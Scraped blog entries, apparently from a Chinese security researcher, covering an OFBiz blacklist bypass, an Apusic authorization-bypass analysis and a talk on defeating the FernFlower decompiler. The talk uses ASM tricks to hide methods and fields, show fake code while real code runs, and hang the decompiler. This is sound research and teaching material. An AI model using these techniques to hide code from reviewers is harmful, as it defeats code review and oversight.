最终执行视图渲染的处理，之后的处理感兴趣就自己跟跟 而我们后台漏洞的利用点ProgramExport,对应视图如下 1&lt;view-map name=&quot;ProgramExport&quot; type=&quot;screen&quot; page=&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;/&gt; 因此也不难理解为什么通过路由最终能调用ProgramExport.groovy的处理了 利用时值得注意的点在直接利用时你会发现在某些版本下无法打成功，其实是因为这里做了一些简单的检查 这里有一些禁止使用的token 可以看到这个配置来源于配置文件 看到拦截的内容简直抽象，不知道从哪里抄来的…不多吐槽，绕过也很简单，黑名单里的限制并不多很容易通过代码层面bypass，当然也可以用unicode编码更直白 Ps:当然还有另一个CVE是关于SSRF以及任意配置读取的利用点也可以自己翻翻后台功能，这里不多做分析了 参考链接Apache OFBiz漏洞 CVE-2023-49070 的前世今生","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Apache","slug":"Apache","permalink":"https://y4tacker.github.io/tags/Apache/"}]},{"title":"Apusic权限绕过浅析","slug":"year/2023/12/Apusic权限绕过浅析","date":"2023-12-26T12:44:38.000Z","updated":"2024-08-04T09:01:49.791Z","comments":true,"path":"2023/12/26/year/2023/12/Apusic权限绕过浅析/","link":"","permalink":"https://y4tacker.github.io/2023/12/26/year/2023/12/Apusic%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/","excerpt":"","text":"Apusic权限绕过浅析真的是浅析前几天去参加补天了，一直想写但是一直抽不出时间学习，由于漏洞比较简单这里也不过多篇幅的讲解，仅分享一些关键的点，在这里关于权限校验Apusic没有使用第三方框架(毕竟是迫真信创产品) 而是使用了自定义实现的安全性约束(关于什么安全性约束百度搜很多文章了不作搬运工)去实现了访问控制 1234567891011&lt;security-constraint&gt; &lt;display-name&gt;test&lt;/display-name&gt; &lt;web-resource-collection&gt; &lt;web-resource-name&gt;protect&lt;/web-resource-name&gt; &lt;url-pattern&gt;/protect&lt;/url-pattern&gt; &lt;url-pattern&gt;/protect/*&lt;/url-pattern&gt; &lt;/web-resource-collection&gt; &lt;auth-constraint&gt; &lt;role-name&gt;admin&lt;/role-name&gt; &lt;/auth-constraint&gt;&lt;/security-constraint&gt; 通过迫真的简单debug过后，发现在com.apusic.web.container.ServletInvocation#preRequest对security-constraint做了检查 跳过垃圾时间(懒)，代码如下很简单，在这里调用了checkResourcePermission去做权限的检查 12345public boolean checkResourcePermission(HttpServletRequest req) &#123; WebResourcePermission perm = new WebResourcePermission(req); Principal principal = Security.getCurrentUser(); return this.checkPermission(perm, principal);&#125; 在这里，通过javax.security.jacc.WebResourcePermission去实现了权限的检查 首先在初始化WebResourcePermission中，先将request对象经过getUriMinusContextPath处理后传入父类，在这里我们可以看到uri是通过request.getRequestURI()去获取之后去除了上下文路径 1234567891011121314151617181920212223242526public WebResourcePermission(HttpServletRequest request) &#123; super(getUriMinusContextPath(request)); this.urlPatternSpec = new URLPatternSpec(super.getName()); this.methodSpec = HttpMethodSpec.getSpec(request.getMethod());&#125;private static String getUriMinusContextPath(HttpServletRequest request) &#123; String uri = request.getRequestURI(); if (uri != null) &#123; String contextPath = request.getContextPath(); int contextLength = contextPath == null ? 0 : contextPath.length(); if (contextLength &gt; 0) &#123; uri = uri.substring(contextLength); &#125; if (uri.equals(&quot;/&quot;)) &#123; uri = &quot;&quot;; &#125; else &#123; uri = uri.replaceAll(&quot;:&quot;, &quot;%3A&quot;); &#125; &#125; else &#123; uri = &quot;&quot;; &#125; return uri;&#125; 调用父类构造函数其实就是将处理好的uri赋值给name 回到WebResourcePermission的构造函数继续往下看，对上面这个name以及请求方法做了赋值，到此构造函数部分执行完毕 12this.urlPatternSpec = new URLPatternSpec(super.getName());this.methodSpec = HttpMethodSpec.getSpec(request.getMethod()); 接下来就是通过com.apusic.web.container.ConstraintMapper#checkPermission去做权限校验了，最终会走到javax.security.jacc.WebResourcePermission#implies处理 有兴趣的可以看看从checkResourcePermission到implies:358之间的调用栈 12345678910implies:358, WebResourcePermission (javax.security.jacc)implies:525, PermissionsHash (java.security)implies:182, Permissions (java.security)implies:48, ApplicationPolicy (com.apusic.security.jacc)implies:58, ServerPolicy (com.apusic.security.jacc)checkPermission:272, ConstraintMapper (com.apusic.web.container)checkResourcePermission:255, ConstraintMapper (com.apusic.web.container)checkResourcePermission:1565, WebContainer (com.apusic.web.container)checkSecurityConstraint:310, ServletInvocation (com.apusic.web.container)preRequest:228, ServletInvocation (com.apusic.web.container) 回到正题，在这里我们可以看到这部分的处理也很简单，一个是对方法的判断，一个是对url的判断，在这里我们看后者即可 继续往下走最终我们可以看到他的比对逻辑，也很简单以/protect/*为例子 pattern是否等于path patter如果以/开头/*结尾，去除后两位后(/protect)如果长度为0也就是仅为/*则返回true，反之判断path是否为/protect或者以/protect开头 1234567891011121314151617181920if (pattern.equals(path)) &#123; return true;&#125; else &#123; int slash; if (pattern.startsWith(&quot;/&quot;) &amp;&amp; pattern.endsWith(&quot;/*&quot;)) &#123; pattern = pattern.substring(0, pattern.length() - 2); slash = pattern.length(); if (slash == 0) &#123; return true; &#125; else &#123; return path.startsWith(pattern) &amp;&amp; (path.length() == slash || path.substring(slash).startsWith(&quot;/&quot;)); &#125; &#125; else if (pattern.startsWith(&quot;*.&quot;)) &#123; slash = path.lastIndexOf(47); int period = path.lastIndexOf(46); return slash &gt;= 0 &amp;&amp; period &gt; slash &amp;&amp; path.endsWith(pattern.substring(1)); &#125; else &#123; return pattern.equals(DEFAULT_PATTERN); &#125;&#125; 权限绕过构造在这里我们关注几个细节一个是url的处理是通过request.getRequestURI()处理那么在这里不会做url解码，在这里可以作为一个绕过的点 另一个细节从lib当中我们可以看到spring的版本是远古版本，因此alwaysUseFullPath为false，因此是会做归一化再去做路由匹配 那么结合这两个点我们就可以构造出非常多的绕过姿势，在这里就不列举了 至于RCE的点那就更多了，可自行发现，源码很简单","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Apusic","slug":"Apusic","permalink":"https://y4tacker.github.io/tags/Apusic/"}]},{"title":"Hacking FernFlower","slug":"year/2023/12/Hacking-FernFlower","date":"2023-12-22T13:16:04.000Z","updated":"2024-08-04T09:01:49.808Z","comments":true,"path":"2023/12/22/year/2023/12/Hacking-FernFlower/","link":"","permalink":"https://y4tacker.github.io/2023/12/22/year/2023/12/Hacking-FernFlower/","excerpt":"","text":"Hacking FernFlower前言​ 今天很开心，第一次作为speaker参与了议题的分享，也很感谢补天白帽大会给了我这样的一次机会 ​ 其实本该在去年来讲Java混淆的议题，不过当时赶上疫情爆发，学校出于安全的考虑没让出省。在当时我更想分享的是对抗所有反混淆的工具cfr、procyon，但今年在准备过程中发现主题太大了其实不太好讲，再考虑到受众都是做web安全的，因此我最终还是将主题定为了对抗反编译工具，在这里选了一些方便大家理解的例子来介绍混淆，主要是想分享一些不一样的思路吧。 ​ 在这次议题当中我仅仅分享了部分较为简单的混淆方式，但他们却很直观易懂，如果你想要更深入的去做更高难度的混淆，还可以尝试对书籍深入理解JAVA虚拟机做一些简单的阅读。 ​ 在这篇文章当中我也会尽量不使用过于复杂的概念，用大家更能接受的形式来讲述一个混淆的例子，当然有些地方可能表述也会存在表述不当的情况，请见谅，全文文章以JDK8为例(懒，并不想测试所有版本支持情况)。 ​ 同时在文章中也会分享部分议题中没有讲的内容，主要是在议题时考虑到时间原因临时做了删除调整。 正文前置​ 首先在开始之前我们需要了解ASM的一些简单用法，ASM其实有两套API，一个是Core API，另一个是Tree API，在这里如果你只是想要学习到在今天议题分享过程当中的一些基本原理那么我认为了解Core API的用法就够了，如果你需要做工具开发，那么我更推荐使用Tree API去完成一个工具的开发，Tree API能更灵活的帮助我们完成我们的需求(比如我们想要在某个指定的字节码操作后做指令的添加)，或者也可以使用其他字节码处理框架。在这里我不会花大篇量的篇幅去写一个关于ASM的教程，但是对于一些关键的点我仍会点出(关于ASM的使用教程网上有很多，对不了解的使用方法部分可以尝试多百度)。 测试代码见https://github.com/Y4tacker/HackingFernFlower 如何生成一个类在这里我们想要生成这样的一个类，类名为Test、字段名为abc、方法名为test 首先我们需要实例化一个ClassWriter对象 1ClassWriter classWriter = new ClassWriter(0); 在这个构造函数当中我们也可以传入其他选项，如ClassWriter.COMPUTE_FRAMES/ClassWriter.COMPUTE_MAX COMPUTE_MAXS：在写入方法时，会自动计算方法的最大堆栈大小和局部变量表的大小。 COMPUTE_FRAMES：在写入方法字节码时，会自动计算方法的堆栈映射帧和局部变量表的大小。使用该参数时，COMPUTE_MAXS参数也会被自动设置。 一般而言在构造方法中我们都可以加上ClassWriter.COMPUTE_FRAMES选项，可以让我们专心字节码的构造，不用考虑 max stacks 、max locals以及stack map frames的计算过程。 生成一个类，参数分别是Java版本号、修饰符、类名、签名、父类、接口（关注红色字即可） 1classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, &quot;Test&quot;, null, &quot;java/lang/Object&quot;, null); 生成一个字段，参数分别是修饰符、字段名、字段类型、签名、值 1234&#123;fieldVisitor = classWriter.visitField(ACC_PUBLIC | ACC_STATIC, &quot;abc&quot;, &quot;Ljava/lang/String;&quot;, null, null);fieldVisitor.visitEnd();&#125; 生成一个方法，参数分别是修饰符、方法名、*方法描述符(入参与返回值)*、签名、异常 12345678910&#123;methodVisitor = classWriter.visitMethod(ACC_PUBLIC | ACC_STATIC, &quot;test&quot;, &quot;()V&quot;, null, null);methodVisitor.visitCode();methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);methodVisitor.visitInsn(ICONST_1);methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(I)V&quot;, false);methodVisitor.visitInsn(RETURN);methodVisitor.visitMaxs(2, 0);methodVisitor.visitEnd();&#125; 自定义查看一个类怎么通过ASM代码生成(必看)当然在开始之前我希望你多了解下ASM的一些代码写法，自己多写几个类，多查看其ASM的生成代码 在这里我教大家如何自定义查看一个类是怎么通过ASM代码生成，多模仿才能更熟练 比如在这里我们需要查看Test.class该如何使用ASM框架的代码生成 通过执行下面的代码你可以获得这个写法(初学时一定要启用参数SKIP_DEBUG、SKIP_FRAMES)，在后面熟练以后可以尝试将其替换为int parsingOptions = ClassReader.EXPAND_FRAMES 123456789101112131415public static void main(String[] args) throws Exception&#123; //需要处理的Class String inputFilename = &quot;./target/classes/Test.class&quot;; String outputFilename = &quot;output.txt&quot;; FileInputStream fileInputStream = new FileInputStream(new File(inputFilename)); // SKIP_DEBUG:用于指示ClassReader在读取类文件时是否跳过调试信息。调试信息包括源代码行号、局部变量名称和范围等信息 // SKIP_FRAMES:指示ClassReader在读取类文件时是否跳过帧信息。帧信息是用于存储方法调用和异常处理的数据结构。如果指定了SKIP_FRAMES常量，那么在读取类文件时将会跳过帧信息，从而减少读取和处理的时间和内存消耗 // EXPAND_FRAMES：指示在生成类文件时是否应该展开帧。帧用于在Java类文件中表示方法的执行状态，包括操作数栈和局部变量表的内容。如果指定了EXPAND_FRAMES常量，那么在生成类文件时将会展开帧信息，从而确保生成的类文件包含完整的帧信息 int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES; Printer printer = new ASMifier(); FileOutputStream fileOutputStream = new FileOutputStream(new File(outputFilename)); PrintWriter printWriter = new PrintWriter(fileOutputStream); TraceClassVisitor traceClassVisitor = new TraceClassVisitor(null, printer, printWriter); new ClassReader(fileInputStream).accept(traceClassVisitor, parsingOptions); &#125; 熟知的Java命名规则真的是这样吗？命名混淆接下来通过一个开胃小菜来帮助我们熟悉ASM的使用方法 在学习Java的时候，第一课通常都是教我们一些编程规范，其中就包含命名的规范，一般而言是下面这几种情况，然而真的是这样么？ 这都是常态化的思维固化了我们，理所当然的认为变量名只能是 名称只能由字母、数字、下划线、$符号组成？ 不能以数字开头？ 名称不能使用JAVA中的关键字？ 坚决不允许出现中文及拼音命名？ 通过测试并不是这样的，这个限制其实只发生在编译的过程(javac)，而在执行过程无限制(java) 123456789101112131415161718int start = 0;int end = 65535;String jdk = &quot;jdk8u341&quot;;boolean onlyDefineClass = true;System.out.println(&quot;---以下是在defineClass下测试_&#123;jdk&#125;--&quot;.replace(&quot;&#123;jdk&#125;&quot;,jdk));for (int i = start; i &lt;= end; i++) &#123; char unicodeChar = (char) i; FuzzMethodName(unicodeChar, jdk, onlyDefineClass); FuzzFieldName(unicodeChar, jdk, onlyDefineClass);&#125;System.out.println(&quot;----------------------------&quot;);onlyDefineClass = false;System.out.println(&quot;---以下在非defineClass下测试_&#123;jdk&#125;--&quot;.replace(&quot;&#123;jdk&#125;&quot;,jdk));for (int i = start; i &lt;= end; i++) &#123; char unicodeChar = (char) i; FuzzMethodName(unicodeChar, jdk, onlyDefineClass); FuzzFieldName(unicodeChar, jdk, onlyDefineClass);&#125; 在这里我们仅仅只是想要让大家知道在不同小版本间有差异，我没有去比对每一个版本，只想让大家知道不同版本间有一些差异即可 Jdk8u20 jdk8u341 因此接下来我们可以通过修改参数name为任意我们想要的值 12345&#123; fieldVisitor = classWriter.visitField(ACC_PUBLIC| ACC_STATIC| ACC_FINAL,&quot;abc&#123;\\nsuper man supersuper\\n&#125;&quot;,&quot;[Ljava/lang/String;&quot;,null,null); fieldVisitor.visitEnd(); &#125; 因此我们可以实现这样的类，如下图所示，可以看到在视觉上非常具有混淆的效果(测试环境jdk8u20，高版本下部分字母不支持) 一个有趣的现象在fuzz的过程当中我发现，当方法名(或其他参数)中出现了\\r(退格键)这个字符，出现了这样一个有趣的现象，类无法拖入IDEA当中做反编译了通过手动执行java -cp org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -jar fernflower.jar /Users/y4tacker/Desktop/MCMSv/HackingFernflower/output/Test.class ./testcode，发现可以正常反编译，因此可以猜测和IDEA其他组件部分代码有关，这里和主题无关就不继续深入研究了 同时通过终端查看字节码时也会发现，这里的显示也很混乱(和\\r退格键在控制台中的输出作用有关)，当然如果你通过javap -v Test将内容输出到文件中打开可正常查看 关注反编译器的默认配置关于fernflower的代码可以在github上查找到社区版的代码,https://github.com/fesh0r/fernflower 当然你也可以在IDEA中获取到专业版代码，以mac为例子，右键程序显示包内容，位置在IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib 在org.jetbrains.java.decompiler.main.extern.IFernflowerPreferences当中有一些默认配置 这里仅列出了默认激活的属性(值为1) 123456789101112131415161718defaults.put(REMOVE_BRIDGE, &quot;1&quot;);defaults.put(REMOVE_SYNTHETIC, &quot;0&quot;);defaults.put(DECOMPILE_ENUM, &quot;1&quot;);defaults.put(USE_DEBUG_VAR_NAMES, &quot;1&quot;);defaults.put(USE_METHOD_PARAMETERS, &quot;1&quot;);defaults.put(FINALLY_DEINLINE, &quot;1&quot;);defaults.put(DECOMPILE_INNER, &quot;1&quot;);defaults.put(DECOMPILE_CLASS_1_4, &quot;1&quot;);defaults.put(DECOMPILE_ASSERTIONS, &quot;1&quot;);defaults.put(IDEA_NOT_NULL_ANNOTATION, &quot;1&quot;);defaults.put(NO_EXCEPTIONS_RETURN, &quot;1&quot;);defaults.put(REMOVE_GET_CLASS_NEW, &quot;1&quot;);defaults.put(ENSURE_SYNCHRONIZED_MONITOR, &quot;1&quot;);defaults.put(BOOLEAN_TRUE_ONE, &quot;1&quot;);defaults.put(UNDEFINED_PARAM_TYPE_OBJECT, &quot;1&quot;);defaults.put(HIDE_EMPTY_SUPER, &quot;1&quot;);defaults.put(HIDE_DEFAULT_CONSTRUCTOR, &quot;1&quot;);defaults.put(REMOVE_EMPTY_RANGES, &quot;1&quot;); 从这些默认配置当中我们发现了几个有趣的配置选项 12345REMOVE_BRIDGE(桥接方法)REMOVE_SYNTHETIC(虽然是0,但是通过IDEA反编译的时候仍然可以做到隐藏的效果，猜测运行时修改了默认属性java -jar fernflower.jar -rsy=1 xxx.class)USE_DEBUG_VAR_NAMES(对应org.jetbrains.java.decompiler.main.rels.ClassWrapper#applyDebugInfo)USE_METHOD_PARAMETERS(对应org.jetbrains.java.decompiler.main.rels.ClassWrapper#applyParameterNames) REMOVE_BRIDGE/REMOVE_SYNTHETIC隐藏方法发现这个属性的读取与处理在最终代码的拼接过程，也就是在org.jetbrains.java.decompiler.main.ClassWriter#classToJava 可以看到如果我们能让hide为true，那么就能让当前方法的输出被跳过 如何让hide为true，可以看到这里有三个条件，满足其一即可 mt.isSynthetic()并且REMOVE_SYNTHETIC属性为1 方法是桥接方法并且REMOVE_BRIDGE属性为1 在hiddenmenmers对象当中 isSynthetic/isBridge在开始前我们可以思考为什么IDEA会选择隐藏这两个方法，因为他们都是由编译器生成的方法 Ps：一些简单的备注，更详细的可以百度看看 桥接方法（bridge method）是为了解决Java泛型擦除带来的问题而引入的一个概念。当一个类实现了一个泛型接口或继承了一个泛型类时，由于Java的泛型擦除机制，会导致继承或实现的方法签名发生变化，这可能会引发编译器警告或错误。为了解决这个问题，Java编译器会在编译时自动生成桥接方法，来确保方法签名的一致性。这些桥接方法通常是合成的，它们的目的是将父类中的泛型方法重写为非泛型方法，以便在继承链中保持方法签名的一致性。桥接方法通常是由编译器自动生成的，开发者不需要手动编写桥接方法。在Java字节码中，桥接方法的标志通常是 ACC_BRIDGE。桥接方法在Java中是一个重要的概念，它确保了在使用泛型时，继承和实现关系的正确性和一致性。 synthetic方法是由编译器生成的、不是由开发人员直接编写的方法。这些方法通常具有特殊的目的，如支持内部类、外部类之间的访问、Java虚拟机的实现细节等。synthetic方法通常是私有的，并且在类的字节码中使用ACC_SYNTHETIC标志进行标记。 一些常见的情况下会生成synthetic方法，如： 内部类：当创建内部类时，编译器通常会生成一个synthetic方法，用于在内部类中访问外部类的私有成员变量或私有方法。 枚举类：对于枚举类，编译器会生成一个包含所有枚举值的静态final数组，并且生成一个synthetic方法用于访问这个数组。 Lambda表达式：在使用Lambda表达式时，编译器可能会生成synthetic方法来支持Lambda表达式的执行。 首先来看如何满足isSynthetic的条件，修饰符带ACC_SYNTHETIC即可，或者带Synthetic属性即可 12345public boolean isSynthetic() &#123; return hasModifier(CodeConstants.ACC_SYNTHETIC) || hasAttribute(StructGeneralAttribute.ATTRIBUTE_SYNTHETIC);&#125;public static final Key&lt;StructGeneralAttribute&gt; ATTRIBUTE_SYNTHETIC = new Key&lt;&gt;(&quot;Synthetic&quot;); 那么我们可以通过ASM很简单的为方法添加修饰符(ACC_BRIDGE/ACC_VOLATILE/ACC_STATIC_PHASE都是0x0040) 1234cw.visitMethod(ACC_PUBLIC | ACC_SYNTHETIC, &quot;abc&quot;, &quot;()V&quot;, null, null);cw.visitMethod(ACC_PUBLIC | ACC_BRIDGE, &quot;abc&quot;, &quot;()V&quot;, null, null);cw.visitMethod(ACC_PUBLIC | ACC_VOLATILE, &quot;abc&quot;, &quot;()V&quot;, null, null);cw.visitMethod(ACC_PUBLIC | ACC_STATIC_PHASE, &quot;abc&quot;, &quot;()V&quot;, null, null); 如何通过ASM为方法添加属性,调用methodVisitor.visitAttribute(new SyntheticAttribute());即可 Ps：自定义实现的SyntheticAttribute类构造函数当中的super代表属性的type 成功实现对abc方法的隐藏 对于桥接方法的条件，和上面同理，不再重复讲解，这里仅列出效果图 如何转换一个类(备注篇)可能有人会好奇能不能通过ASM转换现有的方法呢？当然可以 写一个类继承ClassVisitor 串联ClassWriter即可 结合IDEA的显示特性达到迷惑效果，同时我们在隐藏的方法当中加点料，比如执行一个计算器 hiddenMembers对象过查找发现hiddenMembers的添加主要在几个Processor方法下 和方法相关的比较好用的有EnumProcessor和ClassReference14Processor，这里仅以EnumProcessor为例 在下图中可以看到，只需要满足两者任一分支即可，其中name参数代表方法名 以第一个分支为例子，方法名为values，然后描述符满足下面的情况 入参为空，返回值为当前对象的数组 (其中()代表入参为空，[为数组，中间的变量为全类名利用方法的重载) 甚至更进一步，我们可以结合方法重载的特性，再搞一个同名方法迷惑视线 隐藏字段同理满足任一条件即可 isSynthetic并且REMOVE_SYNTHETIC属性为1 在Hiddenmenmers对象当中 isSyntheticisSynthetic条件同上，修饰符或添加属性，具体可查看我的代码，位置在src/main/java/hidden/field/Synthetic 123public boolean isSynthetic() &#123; return hasModifier(CodeConstants.ACC_SYNTHETIC) || hasAttribute(StructGeneralAttribute.ATTRIBUTE_SYNTHETIC);&#125; hiddenMembers对象同理仅选一个为例子演示 在org.jetbrains.java.decompiler.main.AssertProcessor#buildAssertions中对hiddenMembers添加了字段对象的处理，如果findAssertionField返回不为空即可实现添加 条件很简单字段为Static\\Final\\Synthetic修饰即可 1cw.visitField(ACC_PUBLIC | ACC_STATIC | ACC_FINAL| ACC_SYNTHETIC, fieldName, &quot;Ljava/lang/String;&quot;, null, null); 运行发现，字段也做到了隐藏的效果 自定义方法参数一些需要知道的基础知识Java字节码的attribute_info用于存储与类、字段、方法、代码等相关的附加信息。它是一个可选的部分，可以用来提供一些额外的元数据或调试信息。 attribute_info结构包含以下几个字段： attribute_name_index：一个指向常量池中UTF-8类型常量的索引，表示attribute的名称。 attribute_length：一个无符号的32位整数，表示attribute的长度，单位为字节。 info：包含实际的attribute信息。不同类型的attribute_info具有不同的格式和作用。常见的attribute_info类型包括： JVM在运行时并不直接关注字节码中的attributes，它主要关注的是字节码指令和运行时数据。 虽然JVM不会直接关注attributes，但是这些attributes在运行时仍然有一定的作用。 例如，Code attribute中包含了方法体的字节码指令、异常处理器、局部变量表等信息。JVM在执行方法时会解析这些字节码指令，并根据异常处理器处理异常，同时也会使用局部变量表来存储方法中的局部变量。另外，LineNumberTable attribute中包含了源码行号和字节码行号的对应关系，这对于调试非常有用。当发生异常或进行追踪时，JVM可以使用这些信息来显示源码的行号，帮助开发人员进行调试。 METHOD_PARAMETERS我们可以在代码中自定义一些调试信息，这与默认配置中的USE_METHOD_PARAMETERS/USE_DEBUG_VAR_NAMES有关 这里我们仅仅关注METHOD_PARAMETERS即可 不知道大家有没有发现一个现象，自己在IDEA写的类，反编译后可以看到，方法的参数名都是有一些特定含义的 但是从网上下载的代码却没有(因为被做了优化将属性做了移除) 12USE_DEBUG_VAR_NAMES(对应处理org.jetbrains.java.decompiler.main.rels.ClassWrapper#applyDebugInfo)USE_METHOD_PARAMETERS(对应处理org.jetbrains.java.decompiler.main.rels.ClassWrapper#applyParameterNames) 仔细阅读代码你会发现其实这两个参数最终效果是一致，但是USE_METHOD_PARAMETERS在IDEA的代码层没有做参数的限制(jdk8测试无，但是较高版本java[jdk&lt;=8u271]运行时也有限制了，限制条件同USE_DEBUG_VAR_NAMES，当然其实这些限制都无所谓)，而USE_DEBUG_VAR_NAMES则有 通过简单的fuzz发现限制蛮大的(部分输出) 因此，在这里我们以USE_METHOD_PARAMETERS的构造为主 查看它的处理流程，其实很简单，获取方法中的MethodParameters属性，再通过for循环便利建立字段的映射 既然限制我们已经知道了IDEA是如何处理的，那么接下来就需要知道这些属性是如何传入 在类的初始化解析过程当中，其中方法参数的解析在(org.jetbrains.java.decompiler.struct.attr.StructMethodParametersAttribute#initContent) 可以看到如下图的解析步骤： 读取方法参数个数 读取方法的参数名在本地变量表当中的映射(关键) 读取方法参数类型 那么在接下来我们便开始构造属性，继承Attibute类重写其write方法来实现自定义的写入，这里我比较偷懒的写了一个，能用就行 调用mv.visitAttribute(new MethodParameterAttribute(3,5));即可实现属性添加 Ps:老版本会有一点BUG，函数名中显示没问题，在具体函数功能中仍继续使用了var0/var1/var2/varxx，这里我是最新版IDEA 在这里我们可以看到所有的方法参数都被我们修改为同一名字，大大加大了阅读理解代码的难度 虽然在较高版本中也对fieldname做了限制，但也也只是一些特殊符号的限制，简单写首诗还是可以的(小皮一下),以jdk11为例 (忽略颜色变成白底了找了张老图懒得自己打字了) 属性上还能做什么？上面也提到了，Java运行时一般而言对属性没有直接的依赖，利用这一点我们便可以想想能不能控制属性让IDEA在反编译的过程中报错导致反编译过程提前结束，当然其实有好几种办法，这里我们仅以其中一个为例，这串代码其实就是上面讲到的方法参数的处理过程 我们可以看到有个对md.params[i]的数组下标取值的过程，这时候如果我们多在属性中添加一位，就会因为发生组越界导致反编译失败(比如一个方法拥有三个参数，我们在属性中声明它拥有四个参数) 查看代码效果，此时反编译因出错提前退出，显示效果如图 再进一步，简单反制IDEA既然都看了方法的参数了，那么不妨再往上看看，方法参数又是怎么解析的呢？ 仅看这一串代码你能发现什么么？注意我的光标 以(Ljava/lang/String;)Ljava/lang/String;为例 先获取最后括号内的内容 第一位L进入Case ‘L’分支 让 index 为 ; 所在位置下标 而如果我们不写上最后一个;符号，对java来说一般找不到默认为-1，导致反编译永远卡在这个while循环当中，实现一个DOS攻击 Ps：很狗的是很早之前我给官方提出了这个问题，他们表示并不care也不会做修复，但是在我写PPT前几天无意中更新了IDEA发现似乎被修复了🐶，具体原因还未查看(懒) 这时候有人会问，既然都破坏了类的完整性，那么肯定都无法运行了，确实如此，但是换个角度，如果我们向我们的jar文件当中存入多个这样的class，当有人想反编译jar查看代码的时候，不小心点到了这个类，是不是就会触发小惊喜(手动狗头) 还能隐藏什么？(神奇的JSR) 刚刚我们已经实现了对方法以及字段的隐藏，还能隐藏什么呢？通过阅读反编译的源码我发现了个有趣的指令jsr，在过去它是和ret指令成对出现，用于实现try-catch当中的finally快，但随着jvm的发展后面被移除了，但是java的运行有着向下兼容的特性，因此我们仍然是能使用这个指令 astore 栈顶引用类型保存到本地变量 jsr 跳转指定地址，并压入下一条指令地址 ret 返回指定的指令地址 首先通过下面的例子带大家简单了解下JSR的使用，在这里通过JSR跳转到了label1，在这个过程中会将下一条指令的地址压入栈中，之后执行完Code Here，我们通过ASTORE将栈上地址保存到本地变量表当中指定位置，并通过RET指令实现对Continue Code Here的继续执行 利用这个jsr我们能达到这样的混淆效果，可以看到实际运行与显示不符合 那到底是如何做到的呢？可以看到jsr的处理是在代码生成CFG的过程中，在这里仅仅只是对JSR/RET做了处理(正常情况下jsr/ret的出现是成对的，并且不会有其他指令) 调用栈如下 1234setSubroutineEdges:374, ControlFlowGraphbuildBlocks:204, ControlFlowGraph&lt;init&gt;:44, ControlFlowGraphcodeToJava:74, MethodProcessorRunnable 但是毕竟我们是黑客，总想搞一些骚操作，通过对字节码指令的翻阅我发现了两个有趣的指令 pop/pop2 弹出栈顶数值 swap 栈顶数值交换 因此我们便可以构造出这样的ASM代码(Y4计算器的原理) 代码真实执行与IDEA解析的差异性首先我们来看看代码的真实执行过程(懒了直接偷演讲时的PPT动画) 首先通过JSR跳转到label1，并向栈中压入下一条指令的地址 接着再次通过JSR跳转到label2，并向栈中压入下一条指令的地址 之后我们手动插入了一个POP指令的调用，RA2被弹出，因此最终RET指令返回执行时会执行Real Code Here 那么我们接下来再看看IDEA的解析处理，通过两次JSR跳转压入两条指令返回地址 由于并没有对POP做处理，因此最终返回执行RA2所指向的Fake Code Here 因此我们便可以利用IDEA解析与真实执行的差异性构造出这样的混淆例子，将真实代码隐藏，虚假代码做展示达到一个很好的混淆效果(IDEA所有版本均可) SWAP同样的道理，仅演示 通过两次JSR跳转压入两条指令返回地址 通过SWAP指令交换地址 生成的类触发报错无法反编译(最新版可以，旧版不行，具体版本懒得测) 关注特殊的结构除了关注程序的一些默认配置，我们还可以将视线聚焦在放在一些特殊的结构上面，毕竟结构越特殊，反编译器的处理也会越复杂。 这里我们仅以try-catch来举例，那try-catch为什么特殊呢？ 对于我们Java调用方法而言有两种情况，如果方法是静态方法就可以直接调用，而如果方法是非静态方法那么就需要先实例化一个类再执行调用，而如下图所示Exception调用的方法是非静态方法。因此可以猜测在运行过程中生成了这一个对象并存入了栈中，同时我们也可以通过javap指令简单从astore的前后调用做一个验证 在这里为了方便大家更直观的感受，我写了一个模拟栈与本地变量表之间变化关系的程序，输出如下，可以看到确实很直观的有一个Exception对象的生成 在接下来我们需要简单了解下java自身生成的try-catch的字节码表示，在这里为了防止编译优化，在每个执行中插入了一些输出的字节码指令序列 在这里我们主要关注这个异常表，这个异常表定义了异常处理的范围 从指令0-8，如果能成功执行不报错，那么就会调用goto跳转到指令20继续执行，直到程序退出 如果在指令0-8之间运行产生了错误，就会跳转到target指向的指令11去捕获异常处理，从指令11继续往下执行直到程序退出 在这里为了方便新手对接下来混淆的理解，我们可以尝试在不使用GOTO以及不对结构顺序做调整的情况下实现这个try-catch，如下图所示，从右边来看，程序执行的流动是从startLabel流向endLabel并通过return返回，从handlerLabel流向endLabel并通过return返回，那么可以构造如左图所示的ASM代码片段(因为不使用跳转HandlerLabel只能给其插入一个RETURN保证程序正常退出) 那么既然知道了程序的执行方向都是向下执行并且最终通过RETURN指令退出 那么我们是不是就能大胆假设，在这里将endLabel下的RETURN做移除，那么至少从表面上看执行顺序是没问题的 但这时候我们再运行生成好的程序，成功喜提一个VerifyError的报错，这是因为在执行前，java会对类做验证，如果验证通过才能继续执行，反之抛出异常并退出 但是在这里我们首要关心的不应该是是否验证有异常，而是关心是否能正确执行，在这里我们通过-Xnoverify手动跳过这个过程，可以发现是可以正常执行的 因此接下来我们便可以尝试是否能够欺骗验证过程，从而能够正确执行，我们仔细查看这个报错原因，发现其实和frame有关(什么是frame可自行百度)，在这里教大家一个ASM的小技巧 既然和FRAME有关那么，我们便可以在生成这个类的时候将参数替换为ClassWriter.COMPUTE_FRAMES,上面一开始也提到过这个参数的作用(在写入方法字节码时，会自动计算方法的堆栈映射帧和局部变量表的大小) 因此我们在此生成类并运行可以发现，报错变得非常直观，帧栈的大小不匹配 那么既然少了一个我们便给他补齐一个即可(插入任意对象，仅验证大小的匹配) 